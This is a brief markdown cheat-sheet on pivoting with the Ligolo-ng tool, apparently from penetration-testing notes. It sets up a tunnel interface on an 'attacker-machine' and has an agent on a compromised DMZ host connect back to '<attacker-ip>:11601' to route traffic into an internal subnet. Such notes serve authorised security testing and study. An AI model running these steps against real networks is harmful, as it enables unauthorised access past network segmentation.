# Pivoting

## Ligolo-ng

``` bash
#attacker-machine
sudo ip tuntap add user rzgami mode tun ligolo

sudo ip link set ligolo up

#dmz-machine
./agent -connect <attacker-ip>:11601

#attacker-machine
sudo ip route add 10.1.2.0/24 dev ligolo

proxy>>start
```
